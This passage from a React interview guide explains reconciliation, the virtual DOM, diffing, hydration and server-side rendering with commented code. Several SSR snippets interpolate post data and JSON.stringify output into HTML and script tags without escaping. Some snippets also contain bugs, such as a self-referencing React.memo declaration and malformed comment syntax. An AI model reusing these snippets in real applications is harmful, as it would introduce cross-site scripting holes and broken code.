    this.setState({ count: this.state.count + 1 });
  };
  
  render() {
    console.log('Counter rendered');
    return (
      <div>
        <p>Count: {this.state.count}</p>
        <button onClick={this.increment}>+</button>
      </div>
    );
  }
}

function App() {
  const [show, setShow] = useState(true);
  
  return (
    <div>
      <button onClick={() => setShow(!show)}>Toggle</button>
      
      {/* Scenario 1: Conditional rendering * /}
      {show && <Counter />}
      {/* Counter unmounted when hidden, state lost * /}
      
      {/* Scenario 2: Always rendered * /}
      <div style={{ display: show ? 'block' : 'none' }}>
        <Counter />
      </div>
      {/* Counter stays mounted, state preserved * /}
      
      {/* Scenario 3: Key change * /}
      <Counter key={show ? 'visible' : 'hidden'} />
      {/* Key changes, React creates new instance, state lost * /}
    </div>
  );
}

Reconciliation Performance:
----------------------------

// Expensive reconciliation (avoid)
function ExpensiveList({ items }) {
  return (
    <ul>
      {items.map((item, index) => (
        // ❌ Creating new object every render
        <ExpensiveItem
          key={item.id}
          data={{ ...item }}  // New reference!
          onClick={() => handleClick(item.id)}  // New function!
        />
      ))}
    </ul>
  );
}

// Every render:
// - New data object -> props changed -> ExpensiveItem re-renders
// - New onClick function -> props changed -> ExpensiveItem re-renders

// Optimized reconciliation
const ExpensiveItem = React.memo(ExpensiveItem);

function OptimizedList({ items }) {
  const handleClick = useCallback((id) => {
    // handle click
  }, []);
  
  return (
    <ul>
      {items.map(item => (
        <ExpensiveItem
          key={item.id}
          data={item}  // Same reference if item unchanged
          onClick={handleClick}  // Same function reference
        />
      ))}
    </ul>
  );
}

// React.memo prevents unnecessary re-renders
// Only re-renders if item actually changed

Reconciliation vs Re-rendering:
--------------------------------

// Re-rendering: Calling component function again
function Component() {
  console.log('Component re-rendered');
  return <div>Hello</div>;
}

// Reconciliation: Comparing virtual DOM trees
// Just because component re-renders doesn't mean DOM updates

function Parent() {
  const [count, setCount] = useState(0);
  
  return (
    <div>
      <button onClick={() => setCount(count + 1)}>Count: {count}</button>
      <Child />  {/* Re-renders but reconciliation finds no changes * /}
    </div>
  );
}

const Child = React.memo(function Child() {
  console.log('Child re-rendered'); // Doesn't log (memoized)
  return <div>Static content</div>;
});

// Parent re-renders when count changes
// Child doesn't re-render (React.memo)
// Reconciliation skips Child subtree

Summary:

Reconciliation:
- Process of updating DOM efficiently
- Compares new and old virtual DOM trees
- Calculates minimal changes needed
- O(n) complexity with heuristics
- Different element types = replace tree
- Same element types = update attributes
- Uses keys to track element identity
- Keys must be stable and unique
- Preserves component state when possible
- Foundation for React's performance
*/


/**
79. What is the virtual DOM and how does it differ from the real DOM?
---------------------------------------------------------------------

The Virtual DOM is a lightweight JavaScript representation of the real DOM.
React uses it to optimize updates by calculating changes in memory before
touching the actual DOM.

Virtual DOM Concept:
--------------------

// Real DOM (browser):
<div id="app">
  <h1 class="title">Hello</h1>
  <button>Click</button>
</div>

// Virtual DOM (JavaScript object):
{
  type: 'div',
  props: {
    id: 'app',
    children: [
      {
        type: 'h1',
        props: {
          className: 'title',
          children: 'Hello'
        }
      },
      {
        type: 'button',
        props: {
          children: 'Click'
        }
      }
    ]
  }
}

// Virtual DOM is just a plain JavaScript object
// Cheap to create and manipulate
// Represents what DOM should look like

How Virtual DOM Works:
-----------------------

// 1. Initial Render
function App() {
  return (
    <div>
      <h1>Hello</h1>
      <p>Counter: 0</p>
    </div>
  );
}

// Step 1: Create virtual DOM
const virtualDOM = {
  type: 'div',
  props: {
    children: [
      { type: 'h1', props: { children: 'Hello' } },
      { type: 'p', props: { children: 'Counter: 0' } }
    ]
  }
};

// Step 2: Create real DOM from virtual DOM
const realDOM = document.createElement('div');
const h1 = document.createElement('h1');
h1.textContent = 'Hello';
const p = document.createElement('p');
p.textContent = 'Counter: 0';
realDOM.appendChild(h1);
realDOM.appendChild(p);

// Step 3: Insert into document
document.getElementById('root').appendChild(realDOM);

// 2. Update
function App() {
  const [count, setCount] = useState(0);
  
  return (
    <div>
      <h1>Hello</h1>
      <p>Counter: {count}</p>  {/* Changed! * /}
      <button onClick={() => setCount(count + 1)}>+</button>
    </div>
  );
}

// Step 1: Create new virtual DOM
const newVirtualDOM = {
  type: 'div',
  props: {
    children: [
      { type: 'h1', props: { children: 'Hello' } },
      { type: 'p', props: { children: 'Counter: 1' } },  // Changed
      { type: 'button', props: { onClick: fn, children: '+' } }
    ]
  }
};

// Step 2: Compare (diff) with previous virtual DOM
// - div: same ✓
// - h1: same ✓
// - p: text changed from "Counter: 0" to "Counter: 1" ✓
// - button: same ✓

// Step 3: Update only changed real DOM nodes
p.textContent = 'Counter: 1';  // Only this operation!

Virtual DOM vs Real DOM:
------------------------

// Real DOM operations are EXPENSIVE:

// Creating element
const div = document.createElement('div');  // Slow
div.className = 'container';  // Slow
div.innerHTML = '<h1>Title</h1>';  // Slow
document.body.appendChild(div);  // Slow, triggers reflow

// Why slow?
// - Creates actual browser DOM nodes
// - Triggers layout calculations (reflow)
// - Triggers painting
// - Blocks main thread

// Virtual DOM operations are CHEAP:

// Creating virtual element
const vDiv = {
  type: 'div',
  props: {
    className: 'container',
    children: [
      { type: 'h1', props: { children: 'Title' } }
    ]
  }
};  // Fast! Just JavaScript object

// Why fast?
// - Plain JavaScript object
// - No browser API calls
// - No reflow/repaint
// - Doesn't block main thread

Real DOM:
---------

// Characteristics:
// - Heavyweight
// - Tree structure
// - Browser API
// - Slow manipulation
// - Triggers reflow/repaint
// - UI updates expensive

// Example: Direct DOM manipulation (slow)
function updateList(items) {
  const ul = document.getElementById('list');
  
  // ❌ Slow: Removes all, recreates all
  ul.innerHTML = '';
  items.forEach(item => {
    const li = document.createElement('li');
    li.textContent = item;
    ul.appendChild(li);  // Reflow for each!
  });
}

// Adding 1000 items = 1000 reflows = slow!

Virtual DOM:
------------

// Characteristics:
// - Lightweight
// - JavaScript object
// - Fast manipulation
// - Batches updates
// - Minimal real DOM changes
// - Efficient

// Example: React with virtual DOM (fast)
function List({ items }) {
  return (
    <ul>
      {items.map(item => <li key={item.id}>{item.text}</li>)}
    </ul>
  );
}

// Adding 1 item:
// 1. Creates new virtual DOM (cheap)
// 2. Diffs with previous (cheap)
// 3. Finds: only 1 new <li> needed
// 4. Adds only 1 <li> to real DOM (1 reflow)
// Fast!

Detailed Comparison:
--------------------

// Feature          | Real DOM          | Virtual DOM
// -----------------|-------------------|------------------
// Structure        | Tree of nodes     | JS object tree
// Updates          | Slow              | Fast
// Memory           | Heavy             | Light
// Re-rendering     | Expensive         | Cheap
// Direct access    | Yes               | No
// Manipulation     | document.* API    | React API
// Browser specific | Yes               | No (platform agnostic)

// Performance:

// Real DOM (1000 updates):
for (let i = 0; i < 1000; i++) {
  document.getElementById('counter').textContent = i;
}
// 1000 DOM updates = 1000 reflows = ~500ms

// Virtual DOM (1000 updates):
for (let i = 0; i < 1000; i++) {
  setCount(i);
}
// React batches: 1 virtual DOM update = 1 DOM update = ~5ms

Batching with Virtual DOM:
---------------------------

function Component() {
  const [count1, setCount1] = useState(0);
  const [count2, setCount2] = useState(0);
  const [count3, setCount3] = useState(0);
  
  const handleClick = () => {
    setCount1(c => c + 1);
    setCount2(c => c + 1);
    setCount3(c => c + 1);
  };
  
  return (
    <div>
      <p>Count1: {count1}</p>
      <p>Count2: {count2}</p>
      <p>Count3: {count3}</p>
      <button onClick={handleClick}>Update All</button>
    </div>
  );
}

// Without virtual DOM:
// 3 state updates = 3 DOM updates = 3 reflows

// With virtual DOM:
// 1. Update all state in memory
// 2. Create new virtual DOM with all changes
// 3. Diff with previous
// 4. Apply all DOM changes at once
// 5. Single reflow!

Virtual DOM Tree Example:
--------------------------

// JSX:
<div className="app">
  <header>
    <h1>My App</h1>
    <nav>
      <a href="/">Home</a>
      <a href="/about">About</a>
    </nav>
  </header>
  <main>
    <p>Content here</p>
  </main>
</div>

// Virtual DOM representation:
{
  type: 'div',
  props: {
    className: 'app',
    children: [
      {
        type: 'header',
        props: {
          children: [
            {
              type: 'h1',
              props: { children: 'My App' }
            },
            {
              type: 'nav',
              props: {
                children: [
                  {
                    type: 'a',
                    props: { href: '/', children: 'Home' }
                  },
                  {
                    type: 'a',
                    props: { href: '/about', children: 'About' }
                  }
                ]
              }
            }
          ]
        }
      },
      {
        type: 'main',
        props: {
          children: [
            {
              type: 'p',
              props: { children: 'Content here' }
            }
          ]
        }
      }
    ]
  }
}

// Entire tree is just a JavaScript object!

When Virtual DOM Shines:
-------------------------

// Scenario 1: Frequent small updates
function LiveCounter() {
  const [count, setCount] = useState(0);
  
  useEffect(() => {
    const timer = setInterval(() => {
      setCount(c => c + 1);
    }, 100);  // Update every 100ms
    return () => clearInterval(timer);
  }, []);
  
  return <div>Count: {count}</div>;
}

// 10 updates/second
// Virtual DOM: Minimal overhead
// Real DOM: Would thrash browser

// Scenario 2: Complex UIs
function Dashboard() {
  return (
    <div>
      <Header />
      <Sidebar />
      <MainContent>
        <DataTable data={data} />  {/* 1000 rows * /}
        <Charts />
        <Analytics />
      </MainContent>
      <Footer />
    </div>
  );
}

// Update single data point:
// - Virtual DOM diffs entire tree
// - Finds only one cell changed
// - Updates only that cell
// - Rest of UI untouched

When Virtual DOM Doesn't Help:
-------------------------------

// Initial render: No benefit
// - Must create real DOM anyway
// - Virtual DOM adds overhead
// - Better to use SSR

// Large batch updates:
// - Replacing entire list
// - Virtual DOM overhead wasted
// - Direct DOM manipulation might be faster

Summary:

Virtual DOM:
- JavaScript representation of real DOM
- Lightweight objects
- Fast to create and manipulate
- Enables efficient updates through diffing
- Batches changes
- Minimizes real DOM operations
- Platform agnostic
- Foundation of React's performance

Real DOM:
- Actual browser DOM
- Heavyweight
- Slow to manipulate
- Triggers reflow/repaint
- No batching
- Expensive updates

Virtual DOM Process:
1. Create virtual DOM tree
2. Compare with previous (diff)
3. Calculate minimal changes
4. Batch update real DOM
5. Single reflow/repaint
*/


/**
80. What is diffing in React?
-----------------------------

Diffing is the algorithm React uses to compare two virtual DOM trees (old and new)
and determine the minimum number of operations needed to transform the old tree
into the new one.

Diffing Algorithm Assumptions:
-------------------------------

// React's diffing makes two assumptions for O(n) performance:

// 1. Elements of different types produce different trees
// 2. Developer can hint at stable elements with keys

// These assumptions allow O(n) instead of O(n³) complexity

Diffing Rules:
--------------

// Rule 1: Different Element Types
// --------------------------------

// Old tree:
<div>
  <Counter />
</div>

// New tree:
<span>
  <Counter />
</span>

// React:
// 1. Destroys old <div> and entire subtree
// 2. Unmounts old Counter (state lost)
// 3. Creates new <span>
// 4. Mounts new Counter (fresh state)

// Rule 2: Same Element Type (DOM Elements)
// -----------------------------------------

// Old:
<div className="before" title="old" />

// New:
<div className="after" title="new" />

// React:
// 1. Keeps same DOM node
// 2. Compares attributes
// 3. Updates only changed attributes
//    - className: "before" -> "after"
//    - title: "old" -> "new"

// Rule 3: Same Component Type
// ----------------------------

// Old:
<Counter value={5} />

// New:
<Counter value={10} />

// React:
// 1. Keeps component instance
// 2. Updates props
// 3. Calls componentDidUpdate or useEffect
// 4. State preserved

// Rule 4: Recursing on Children
// ------------------------------

// Old:
<ul>
  <li>A</li>
  <li>B</li>
</ul>

// New:
<ul>
  <li>A</li>
  <li>B</li>
  <li>C</li>
</ul>

// React iterates children:
// 1. <li>A</li> matches <li>A</li> ✓
// 2. <li>B</li> matches <li>B</li> ✓
// 3. Insert <li>C</li> +

Detailed Diffing Process:
--------------------------

// Example: Todo list update

function TodoList({ todos }) {
  return (
    <ul>
      {todos.map(todo => (
        <li key={todo.id}>
          <span>{todo.text}</span>
          <button>Delete</button>
        </li>
      ))}
    </ul>
  );
}

// Initial state:
const todos = [
  { id: 1, text: 'Buy milk' },
  { id: 2, text: 'Walk dog' },
  { id: 3, text: 'Write code' }
];

// Virtual DOM:
<ul>
  <li key="1">
    <span>Buy milk</span>
    <button>Delete</button>
  </li>
  <li key="2">
    <span>Walk dog</span>
    <button>Delete</button>
  </li>
  <li key="3">
    <span>Write code</span>
    <button>Delete</button>
  </li>
</ul>

// After deleting item 2:
const todos = [
  { id: 1, text: 'Buy milk' },
  { id: 3, text: 'Write code' }
];

// New virtual DOM:
<ul>
  <li key="1">
    <span>Buy milk</span>
    <button>Delete</button>
  </li>
  <li key="3">
    <span>Write code</span>
    <button>Delete</button>
  </li>
</ul>

// Diffing process:
// 1. Compare <ul> elements: same type ✓
// 2. Compare children by key:
//    - key="1": found in both, compare subtree ✓
//    - key="2": not in new tree, remove -
//    - key="3": found in both, compare subtree ✓
// 3. Operations:
//    - Keep <li key="1">
//    - Remove <li key="2">
//    - Keep <li key="3">
// 4. Single DOM operation: remove one <li>

Keys and Diffing:
-----------------

// Without keys (bad performance)
function BadList() {
  const items = ['A', 'B', 'C'];
  
  return (
    <ul>
      {items.map((item, index) => (
        <li key={index}>{item}</li>
      ))}
    </ul>
  );
}

// Initial:
<ul>
  <li key="0">A</li>
  <li key="1">B</li>
  <li key="2">C</li>
</ul>

// After inserting 'X' at start:
<ul>
  <li key="0">X</li>
  <li key="1">A</li>
  <li key="2">B</li>
  <li key="3">C</li>
</ul>

// Diffing with index keys:
// key="0": "A" -> "X" (update content)
// key="1": "B" -> "A" (update content)
// key="2": "C" -> "B" (update content)
// key="3": new, insert "C"
// Result: 4 operations!

// With proper keys (good performance)
function GoodList() {
  const items = [
    { id: 'a', text: 'A' },
    { id: 'b', text: 'B' },
    { id: 'c', text: 'C' }
  ];
  
  return (
    <ul>
      {items.map(item => (
        <li key={item.id}>{item.text}</li>
      ))}
    </ul>
  );
}

// After inserting item with id='x' at start:
// Diffing with stable keys:
// key="x": new, insert "X"
// key="a": found, keep "A"
// key="b": found, keep "B"
// key="c": found, keep "C"
// Result: 1 operation!

Diffing Edge Cases:
-------------------

// Edge Case 1: Reordering without keys
const items1 = ['A', 'B', 'C'];
const items2 = ['C', 'B', 'A'];

// Without keys:
// - React thinks all items changed
// - Updates every <li> content
// - Inefficient!

// With keys:
// - React recognizes items moved
// - Reorders DOM nodes
// - No content updates needed
// - Efficient!

// Edge Case 2: Component type changes mid-tree
function App() {
  const [type, setType] = useState('input');
  
  return (
    <div>
      {type === 'input' ? (
        <InputField />
      ) : (
        <TextArea />
      )}
    </div>
  );
}

// Changing type:
// - Unmounts InputField (state lost)
// - Mounts TextArea (fresh state)
// - No diffing, full replacement

// Solution: Use same component
function App() {
  const [multiline, setMultiline] = useState(false);
  
  return (
    <div>
      <TextField multiline={multiline} />
    </div>
  );
}

// Now:
// - TextField stays mounted
// - Props updated
// - State preserved

Diffing Performance:
--------------------

// Expensive diffing (avoid)
function SlowList({ items }) {
  return (
    <div>
      {items.map((item, index) => (
        <div key={index}>
          <ExpensiveComponent data={item} />
        </div>
      ))}
    </div>
  );
}

// Every update:
// - Compares all items
// - Re-renders all ExpensiveComponent instances
// - Slow!

// Optimized diffing
const ExpensiveComponent = React.memo(ExpensiveComponent);

function FastList({ items }) {
  return (
    <div>
      {items.map(item => (
        <div key={item.id}>
          <ExpensiveComponent data={item} />
        </div>
      ))}
    </div>
  );
}

// Only changed items:
// - Diffing identifies changed items by stable key
// - React.memo prevents re-render if data unchanged
// - Fast!

Diffing Algorithm Steps:
-------------------------

// Step 1: Compare root elements
function diffTrees(oldTree, newTree) {
  // Different types? Replace entire tree
  if (oldTree.type !== newTree.type) {
    return ['REPLACE', newTree];
  }
  
  // Same type, continue diffing
  return diffElement(oldTree, newTree);
}

// Step 2: Compare attributes
function diffElement(oldElement, newElement) {
  const patches = [];
  
  // Diff props
  const oldProps = oldElement.props || {};
  const newProps = newElement.props || {};
  
  // Find changed/removed props
  Object.keys(oldProps).forEach(key => {
    if (newProps[key] !== oldProps[key]) {
      patches.push(['UPDATE_PROP', key, newProps[key]]);
    }
  });
  
  // Find new props
  Object.keys(newProps).forEach(key => {
    if (!(key in oldProps)) {
      patches.push(['ADD_PROP', key, newProps[key]]);
    }
  });
  
  // Diff children
  patches.push(...diffChildren(oldElement.children, newElement.children));
  
  return patches;
}

// Step 3: Diff children
function diffChildren(oldChildren, newChildren) {
  const patches = [];
  const maxLength = Math.max(oldChildren.length, newChildren.length);
  
  for (let i = 0; i < maxLength; i++) {
    patches.push(diff(oldChildren[i], newChildren[i], i));
  }
  
  return patches;
}

// Step 4: Apply patches to DOM
function applyPatches(domNode, patches) {
  patches.forEach(patch => {
    const [type, ...args] = patch;
    
    switch (type) {
      case 'REPLACE':
        domNode.replaceWith(createDOM(args[0]));
        break;
      case 'UPDATE_PROP':
        domNode.setAttribute(args[0], args[1]);
        break;
      case 'ADD_PROP':
        domNode.setAttribute(args[0], args[1]);
        break;
      case 'REMOVE':
        domNode.remove();
        break;
    }
  });
}

Optimizing Diffing:
-------------------

// 1. Use proper keys
<ul>
  {items.map(item => (
    <li key={item.id}>{item.name}</li>
  ))}
</ul>

// 2. Keep element types consistent
// ❌ Bad
{condition ? <div>...</div> : <span>...</span>}

// ✅ Good
<div className={condition ? 'class-a' : 'class-b'}>...</div>

// 3. Memoize expensive components
const HeavyComponent = React.memo(HeavyComponent);

// 4. Avoid inline objects/arrays in props
// ❌ Bad
<Component data={{ value: 1 }} />

// ✅ Good
const data = useMemo(() => ({ value: 1 }), []);
<Component data={data} />

// 5. Split components for granular updates
// ❌ Bad - entire list re-renders
function BigList({ items, filter }) {
  const filtered = items.filter(i => i.category === filter);
  return filtered.map(item => <Item item={item} />);
}

// ✅ Good - only Filter re-renders
function BigList({ items }) {
  return items.map(item => <Item item={item} />);
}

function FilteredList({ items, filter }) {
  const filtered = useMemo(
    () => items.filter(i => i.category === filter),
    [items, filter]
  );
  return <BigList items={filtered} />;
}

Summary:

Diffing Algorithm:
- Compares old and new virtual DOM trees
- O(n) complexity (linear time)
- Finds minimal set of changes
- Uses heuristics for speed
- Different types = replace tree
- Same types = update attributes
- Keys identify stable elements
- Recurses on children
- Enables efficient DOM updates
- Foundation of React performance
*/


/**
81. What is hydration in React?
-------------------------------

Hydration is the process of attaching React event handlers and state to server-rendered
HTML, making it interactive. The HTML is already present (from SSR), and hydration
"brings it to life" on the client.

Server-Side Rendering (SSR) + Hydration Flow:
----------------------------------------------

// 1. Server renders HTML
// Server:
import { renderToString } from 'react-dom/server';

const html = renderToString(<App />);
// Returns: "<div><h1>Hello</h1><button>Click me</button></div>"

// Send to client:
res.send(`
  <!DOCTYPE html>
  <html>
    <body>
      <div id="root">${html}</div>
      <script src="/bundle.js"></script>
    </body>
  </html>
`);

// 2. Browser receives HTML
// - Parses HTML immediately
// - Renders UI (users see content)
// - Downloads JavaScript bundle
// - JavaScript executes
// - Hydration begins

// 3. Client hydrates
// Client:
import { hydrateRoot } from 'react-dom/client';

hydrateRoot(document.getElementById('root'), <App />);

// React:
// - Creates virtual DOM from <App />
// - Compares with existing HTML
// - Attaches event handlers
// - Sets up state management
// - Makes page interactive

Why Hydration:
--------------

// Without SSR (Client-only rendering):

// 1. Browser loads HTML
<html>
  <body>
    <div id="root"></div>  {/* Empty! * /}
    <script src="/bundle.js"></script>
  </body>
</html>

// 2. JavaScript downloads and executes
// 3. React renders UI
// 4. User sees content

// Timeline:
// 0ms:    Browser receives HTML (blank page)
// 0-500ms: Downloading JavaScript
// 500ms:  JavaScript executes, React renders
// 500ms:  User finally sees content

// With SSR + Hydration:

// 1. Browser loads HTML
<html>
  <body>
    <div id="root">
      {/* Already has content! * /}
      <h1>Hello</h1>
      <button>Click me</button>
    </div>
    <script src="/bundle.js"></script>
  </body>
</html>

// Timeline:
// 0ms:    User sees content (from HTML)
// 0-500ms: JavaScript downloading (user sees content)
// 500ms:  Hydration completes (interactive)

// Benefits:
// - Faster First Contentful Paint (FCP)
// - Better SEO (search engines see content)
// - Better perceived performance

Hydration Process:
------------------

function App() {
  const [count, setCount] = useState(0);
  
  return (
    <div>
      <h1>Counter</h1>
      <p>Count: {count}</p>
      <button onClick={() => setCount(count + 1)}>
        Increment
      </button>
    </div>
  );
}

// Server renders to HTML:
<div>
  <h1>Counter</h1>
  <p>Count: 0</p>
  <button>Increment</button>
</div>

// Client hydrates:
hydrateRoot(document.getElementById('root'), <App />);

// React:
// 1. Renders <App /> in memory (virtual DOM)
// 2. Compares with existing HTML
// 3. Verifies markup matches
// 4. Attaches onClick handler to button
// 5. Sets up useState hook
// 6. Button now interactive!

Hydration vs Render:
--------------------

// render() - Client-only
import { createRoot } from 'react-dom/client';

const root = createRoot(document.getElementById('root'));
root.render(<App />);

// - Expects empty container
// - Creates all DOM nodes from scratch
// - No existing HTML expected

// hydrateRoot() - After SSR
import { hydrateRoot } from 'react-dom/client';

hydrateRoot(document.getElementById('root'), <App />);

// - Expects existing HTML
// - Reuses DOM nodes
// - Only attaches handlers/state
// - More efficient

Hydration Mismatches:
---------------------

// Mismatch causes re-render and warning

// Server:
function App() {
  return <div>{new Date().toString()}</div>;
}

// Renders: <div>Sun Dec 14 2025 13:54:00</div>

// Client (later):
function App() {
  return <div>{new Date().toString()}</div>;
}

// Renders: <div>Sun Dec 14 2025 13:54:01</div>

// Different!
// Console warning: "Hydration failed because the initial UI does not match..."
// React throws away server HTML and re-renders client-side
// Defeats purpose of SSR!

// Common mismatch causes:

// 1. Different data on server vs client
// ❌ Bad
function RandomNumber() {
  return <div>{Math.random()}</div>;
}

// 2. Browser-only APIs
// ❌ Bad
function Component() {
  return <div>{window.innerWidth}</div>;
}

// 3. Date/Time without synchronization
// ❌ Bad
function Clock() {
  return <div>{new Date().toISOString()}</div>;
}

// Solutions:

// Solution 1: Use useEffect for client-only code
function Component() {
  const [width, setWidth] = useState(0);
  
  useEffect(() => {
    setWidth(window.innerWidth);
  }, []);
  
  return <div>Width: {width || 'Loading...'}</div>;
}

// Server renders: "Width: Loading..."
// Client hydrates: "Width: Loading..."
// useEffect runs: "Width: 1920"
// No mismatch!

// Solution 2: Suppress hydration warning (rare!)
function Component() {
  return (
    <div suppressHydrationWarning>
      {new Date().toString()}
    </div>
  );
}

// Tells React: "I know these will differ, don't warn me"
// Use sparingly!

// Solution 3: Two-pass rendering
function Component() {
  const [isClient, setIsClient] = useState(false);
  
  useEffect(() => {
    setIsClient(true);
  }, []);
  
  if (!isClient) {
    // Server and initial client render
    return <div>Loading...</div>;
  }
  
  // Only after hydration
  return <div>{Math.random()}</div>;
}

Selective Hydration (React 18):
--------------------------------

// React 18 allows hydrating parts incrementally

import { lazy, Suspense } from 'react';
import { hydrateRoot } from 'react-dom/client';

const Comments = lazy(() => import('./Comments'));
const Sidebar = lazy(() => import('./Sidebar'));

function App() {
  return (
    <div>
      <Header />
      <MainContent />
      
      <Suspense fallback={<div>Loading comments...</div>}>
        <Comments />
      </Suspense>
      
      <Suspense fallback={<div>Loading sidebar...</div>}>
        <Sidebar />
      </Suspense>
    </div>
  );
}

hydrateRoot(document.getElementById('root'), <App />);

// Hydration order:
// 1. Header and MainContent hydrate immediately
// 2. Comments and Sidebar hydrate when JS loads
// 3. Can interact with Header while Comments loads!
// 4. Prioritizes user interaction

// If user clicks in Comments before it hydrates:
// - React prioritizes hydrating Comments
// - Sidebar waits
// - Better interactivity!

Progressive Hydration Example:
-------------------------------

// Server renders everything:
<html>
  <body>
    <div id="root">
      <header>Header content</header>
      <main>Main content</main>
      <div class="comments">100 comments...</div>
      <aside class="sidebar">Sidebar...</aside>
    </div>
  </body>
</html>

// Client hydrates progressively:

// Time 0ms: User sees all content
// Time 100ms: Header interactive
// Time 200ms: Main interactive
// Time 300ms: User clicks on comments section
// Time 310ms: Comments hydrated (prioritized!)
// Time 400ms: Sidebar hydrates

// Without selective hydration:
// - Must wait for all JS to download
// - Hydrate everything before anything interactive
// - Slower time to interactive

Partial Hydration:
-------------------

// Some components never hydrate (static content)

function Article({ content }) {
  return (
    <div>
      <ArticleHeader />
      
      {/* Static content, no hydration needed * /}
      <div dangerouslySetInnerHTML={{ __html: content }} />
      
      {/* Interactive comments * /}
      <Comments />
    </div>
  );
}

// Benefits:
// - Less JavaScript shipped
// - Faster hydration
// - Lower memory usage

Full Example: Blog Post
------------------------

// Server (Node.js):
import { renderToString } from 'react-dom/server';
import BlogPost from './BlogPost';

app.get('/post/:id', async (req, res) => {
  const post = await fetchPost(req.params.id);
  const html = renderToString(<BlogPost post={post} />);
  
  res.send(`
    <!DOCTYPE html>
    <html>
      <head>
        <title>${post.title}</title>
        <link rel="stylesheet" href="/styles.css">
      </head>
      <body>
        <div id="root">${html}</div>
        <script>
          window.__INITIAL_DATA__ = ${JSON.stringify(post)};
        </script>
        <script src="/bundle.js"></script>
      </body>
    </html>
  `);
});

// Client:
import { hydrateRoot } from 'react-dom/client';
import BlogPost from './BlogPost';

// Get data from server
const post = window.__INITIAL_DATA__;

// Hydrate with same data
hydrateRoot(
  document.getElementById('root'),
  <BlogPost post={post} />
);

// Now interactive!

Debugging Hydration Issues:
----------------------------

// Enable React DevTools
// Shows hydration warnings clearly

// Check console for:
// "Warning: Text content did not match..."
// "Warning: Expected server HTML to contain..."
// "Warning: Did not expect server HTML to contain..."

// Common fixes:

// 1. Wrap client-only code in useEffect
useEffect(() => {
  // Client-only code here
}, []);

// 2. Use suppressHydrationWarning sparingly
<div suppressHydrationWarning>
  {clientOnlyContent}
</div>

// 3. Ensure same data on server and client
// Pass data via window.__INITIAL_DATA__

// 4. Avoid Math.random(), Date.now() during render
// Use useEffect instead

Summary:

Hydration:
- Attaches React to server-rendered HTML
- Makes static HTML interactive
- Reuses existing DOM nodes
- Faster initial page load
- Better SEO
- Use hydrateRoot() instead of createRoot()
- Must match server HTML exactly
- React 18 enables selective/progressive hydration
- Critical for SSR applications
- Improves Time to Interactive (TTI)
*/


/**
82. What is server-side rendering (SSR)?
----------------------------------------

Server-Side Rendering (SSR) is the process of rendering React components to HTML
on the server and sending fully-rendered HTML to the client. The client then
"hydrates" the HTML to make it interactive.

SSR vs Client-Side Rendering (CSR):
------------------------------------

// Client-Side Rendering (CSR):
// 1. Server sends minimal HTML + JavaScript bundle
// 2. Browser downloads JavaScript
// 3. JavaScript executes
// 4. React renders UI
// 5. User sees content

// HTML sent by server:
<!DOCTYPE html>
<html>
  <body>
    <div id="root"></div>  {/* Empty! * /}
    <script src="/bundle.js"></script>
  </body>
</html>

// Server-Side Rendering (SSR):
// 1. Server renders React to HTML
// 2. Server sends fully-rendered HTML
// 3. User sees content immediately
// 4. JavaScript downloads in background
// 5. Hydration makes it interactive

// HTML sent by server:
<!DOCTYPE html>
<html>
  <body>
    <div id="root">
      {/* Already has content! * /}
      <div class="app">
        <header><h1>My App</h1></header>
        <main><p>Content here...</p></main>
      </div>
    </div>
    <script src="/bundle.js"></script>
  </body>
</html>

Basic SSR Setup:
----------------

// Server (Node.js + Express):
import express from 'express';
import React from 'react';
import { renderToString } from 'react-dom/server';
import App from './App';

const app = express();

app.get('*', (req, res) => {
  // Render React component to HTML string
  const html = renderToString(<App />);
  
  // Send complete HTML
  res.send(`
    <!DOCTYPE html>
    <html>
      <head>
        <title>My SSR App</title>
        <link rel="stylesheet" href="/styles.css">
      </head>
      <body>
        <div id="root">${html}</div>
        <script src="/bundle.js"></script>
      </body>
    </html>
  `);
});

app.listen(3000);

// Client (browser):
import { hydrateRoot } from 'react-dom/client';
import App from './App';

hydrateRoot(document.getElementById('root'), <App />);

SSR with Data Fetching:
-----------------------

// App component:
function App({ posts }) {
  return (
    <div>
      <h1>Blog Posts</h1>
      {posts.map(post => (
        <article key={post.id}>
          <h2>{post.title}</h2>
          <p>{post.excerpt}</p>
        </article>
      ))}
    </div>
  );
}

// Server:
app.get('/', async (req, res) => {
  // 1. Fetch data on server
  const posts = await fetchPosts();
  
  // 2. Render with data
  const html = renderToString(<App posts={posts} />);
  
  // 3. Send HTML + data
  res.send(`
    <!DOCTYPE html>
    <html>
      <body>
        <div id="root">${html}</div>
        <script>
          // Pass data to client
          window.__INITIAL_DATA__ = ${JSON.stringify({ posts })};
        </script>
        <script src="/bundle.js"></script>
      </body>
    </html>
  `);
});

// Client:
const initialData = window.__INITIAL_DATA__;
hydrateRoot(
  document.getElementById('root'),
  <App posts={initialData.posts} />
);

SSR Benefits:
-------------

// 1. Faster First Contentful Paint (FCP)
// User sees content immediately, not after JavaScript loads

// CSR: 0ms (blank) -> 500ms (content)
// SSR: 0ms (content) -> 500ms (interactive)

// 2. Better SEO
// Search engines see fully-rendered HTML

// CSR: <div id="root"></div> (no content for crawlers)
// SSR: <div id="root"><h1>Title</h1><p>Content...</p></div>

// 3. Social Media Sharing
// Meta tags populated for rich previews

app.get('/post/:id', async (req, res) => {
  const post = await fetchPost(req.params.id);
  
  res.send(`
    <!DOCTYPE html>
    <html>
      <head>
        <title>${post.title}</title>
        <meta property="og:title" content="${post.title}">
        <meta property="og:description" content="${post.excerpt}">
        <meta property="og:image" content="${post.image}">
      </head>
      <body>
        <div id="root">${renderToString(<Post post={post} />)}</div>
      </body>
    </html>
  `);
});

// 4. Better Performance on Slow Devices
// Less JavaScript to parse and execute

SSR Challenges:
---------------

// 1. Server Load
// Server must render every request

// Solution: Caching
const cache = new Map();

app.get('/post/:id', async (req, res) => {
  const { id } = req.params;
  
  // Check cache
  if (cache.has(id)) {
    return res.send(cache.get(id));
  }
  
  // Render and cache
  const post = await fetchPost(id);
  const html = renderToString(<Post post={post} />);
  cache.set(id, html);
  
  res.send(html);
});

// 2. Longer Time to Interactive (TTI)
// Must download JavaScript before interactive

// Timeline:
// 0ms: User sees content (FCP)
// 0-500ms: Downloading JavaScript
// 500ms: Hydration begins
// 600ms: Interactive (TTI)

// CSR Timeline:
// 0ms: Blank page
// 0-500ms: Downloading JavaScript
// 500ms: React renders (FCP)
// 600ms: Interactive (TTI)

// SSR: Better FCP, same TTI
// CSR: Worse FCP, same TTI

// 3. Code Complexity
// Must work on server and client

// ❌ Won't work on server:
function Component() {
  const width = window.innerWidth; // window not defined on server!
  return <div>{width}</div>;
}
